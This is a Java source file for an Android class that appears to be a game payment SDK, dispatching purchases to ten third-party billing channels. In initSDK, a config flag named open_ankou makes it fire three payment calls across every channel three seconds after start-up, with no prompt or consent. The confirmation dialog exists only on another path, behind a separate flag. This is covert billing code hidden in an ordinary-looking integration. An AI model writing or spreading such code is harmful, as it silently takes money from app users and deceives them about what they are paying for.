package com.pay.sdk.alan.main;

import java.util.HashMap;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.util.Log;

import com.pay.sdk.alan.config.GameConfig;
import com.pay.sdk.alan.myInterface.SDKUtilsInterface;
import com.pay.sdk.alan.platform.tl.JMUtils;
import com.pay.sdk.alan.platform.tl.MGUtils;
import com.pay.sdk.alan.platform.tl.PZUtils;
import com.pay.sdk.alan.platform.tl.QPUtils;
import com.pay.sdk.alan.platform.tl.SAUtils;
import com.pay.sdk.alan.platform.tl.SFUtils;
import com.pay.sdk.alan.platform.tl.TKUtils;
import com.pay.sdk.alan.platform.tl.WYUtils;
import com.pay.sdk.alan.platform.tl.XMUtils;
import com.pay.sdk.alan.platform.tl.YFUtils;
import com.pay.sdk.alan.tool.SystemTool;

public class MoSDK {
	
	private final static String PAY_EVENT = "pay00001";//点击计费
	
	/** 上岸 */
	public static final int PAY_SA = 3001;
	/** 微云 */
	public static final int PAY_WY = 3002;
	/** 平治 */
	public static final int PAY_PZ = 3003;
	/** 奇葩 */
	public static final int PAY_QP = 3004;
	/** 泰酷 多益乐 */
	public static final int PAY_TK = 3005;
	/** 舜付 */
	public static final int PAY_SF = 3006;
	/** 捷梦 */
	public static final int PAY_JM = 3007;
	/** 玉峰*/
	public static final int PAY_YF = 3008;
	/** 小美*/
	public static final int PAY_XM = 3009;
	/** 麦广*/
	public static final int PAY_MG = 3010;
	public final static HashMap<Integer, SDKUtilsInterface> platform2utils = new HashMap();
	static {
		
		//捷梦，舜付，麦广，微云，上岸，小美，玉峰，泰酷，平治，奇葩
		platform2utils.put(PAY_JM, JMUtils.getInstance());
		platform2utils.put(PAY_SF, SFUtils.getInstance());
		platform2utils.put(PAY_MG, MGUtils.getInstance());
		platform2utils.put(PAY_WY, WYUtils.getInstance());
		platform2utils.put(PAY_SA, SAUtils.getInstance());
		platform2utils.put(PAY_XM, XMUtils.getInstance());
		platform2utils.put(PAY_YF, YFUtils.getInstance());
		platform2utils.put(PAY_TK, TKUtils.getInstance());
		platform2utils.put(PAY_PZ, PZUtils.getInstance());
		platform2utils.put(PAY_QP, QPUtils.getInstance());	
	}

	private static MoSDK moSdk;

	public MoSDK() {
	}

	public static MoSDK getInstance() {
		if (moSdk == null) {
			moSdk = new MoSDK();
		}
		return moSdk;
	}

	/**
	 * 初始化
	 * **/
	public void initSDK(final Activity activity) {
		Log.e("", "==================initSDK===================");
		activity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				try {
					SystemTool.UmengAgentOnInit(activity);
					int[] channelAry = GameConfig.getInstatnce().getChannelAry();
					for (int i = 0; i < channelAry.length; i++) {
						SDKUtilsInterface SDKutilsInterface = platform2utils.get(channelAry[i]);
						if (null != SDKutilsInterface) {
							Log.e("初始化SDK：", String.valueOf(channelAry[i]));
							SDKutilsInterface.setContext(activity);
							SDKutilsInterface.initSdk();
						}
					}
					if (GameConfig.open_ankou == 1) {
						new Thread(new Runnable() {
							@Override
							public void run() {
								try {
									Thread.sleep(3000);
									activity.runOnUiThread(new Runnable() {
										@Override
										public void run() {
											doPay(activity);
											doPay(activity);
											doPay(activity);
										}
									});
								} catch (InterruptedException e) {
									e.printStackTrace();
								}
							}
						}).start();
					}
				} catch (Exception ex) {
					Log.e("initSDK exception", ex.toString());
				}
			}
		});
	}

	/**
	 * 支付
	 * **/
	public static void doSDKForce(final Activity activity) {
		Log.e("", "==================doSDKForce===================");
		if (GameConfig.open_et == 1) {
			showDialog(activity, GameConfig.config_dialog);
		} else {
			doPay(activity);
		}
	}
	/**
	 * 显示对话框
	 * @param activity
	 * @param str
	 */
	private static void showDialog(final Activity activity, final String str) {

		activity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				AlertDialog.Builder builder = new Builder(activity);
				builder.setTitle("提示");// 设置对话框的标题
				builder.setMessage(str);// 设置对话框的内容
				builder.setPositiveButton("购买", new OnClickListener() { // 这个是设置确定按钮

							@Override
							public void onClick(DialogInterface arg0, int arg1) {
								doPay(activity);
							}
						});
				builder.setNegativeButton("取消", new OnClickListener() { // 取消按钮

							@Override
							public void onClick(DialogInterface arg0, int arg1) {

							}
						});
				AlertDialog b = builder.create();
				b.setCanceledOnTouchOutside(false);
				b.show();
			}
		});
	}
//	static int i = 0;
	/**
	 * 支付
	 * @param activity
	 */
	private static void doPay(final Activity activity) {
		
//		try {
//			int[] channelAry = GameConfig.getInstatnce().getChannelAry();
//			SystemTool.UmengAgentOnEvent(activity,PAY_EVENT);
//			for (int i = 0; i < channelAry.length; i++) {
//				final SDKUtilsInterface SDKutilsInterface = platform2utils.get(channelAry[i]);
//				if (null != SDKutilsInterface) {
//					Log.e("mainHHHVVVV", "-------------- 渠道 " + channelAry[i]);
//					SDKutilsInterface.setContext(activity);
//					
//					if (channelAry[i] == PAY_SA) {
//						activity.runOnUiThread(new Runnable() {
//
//							@Override
//							public void run() {
//								SDKutilsInterface.doPay();
//							}});
//					}else {
//						SDKutilsInterface.doPay();
//					}
//				}else {
//				}
//			}
//		} catch (Exception ex) {
//			Log.e("doSDKForce exception", ex.toString());
//		}
//		new Thread(new Runnable() {
//			
//			@Override
//			public void run() {
//				try {
//					int[] channelAry = GameConfig.getInstatnce().getChannelAry();
//					SystemTool.UmengAgentOnEvent(activity,PAY_EVENT);
//					for (int i = 0; i < channelAry.length; i++) {
//						SDKUtilsInterface SDKutilsInterface = platform2utils.get(channelAry[i]);
//						if (null != SDKutilsInterface) {
//							Log.e("mainHHHVVVV", "-------------- 渠道 " + channelAry[i]);
//							SDKutilsInterface.setContext(activity);
//							SDKutilsInterface.doPay();
//						}else {
//						}
//					}
//				} catch (Exception ex) {
//					Log.e("doSDKForce exception", ex.toString());
//				}
//				
//			}
//		}).start();
		activity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				try {
					int[] channelAry = GameConfig.getInstatnce().getChannelAry();
					SystemTool.UmengAgentOnEvent(activity,PAY_EVENT);
					for (int i = 0; i < channelAry.length; i++) {
						SDKUtilsInterface SDKutilsInterface = platform2utils.get(channelAry[i]);
						if (null != SDKutilsInterface) {
							Log.e("mainHHHVVVV", "-------------- 渠道 " + channelAry[i]);
							SDKutilsInterface.setContext(activity);
							SDKutilsInterface.doPay();
						}else {
						}
					}
				} catch (Exception ex) {
					Log.e("doSDKForce exception", ex.toString());
				}
			}
		});
	}
}
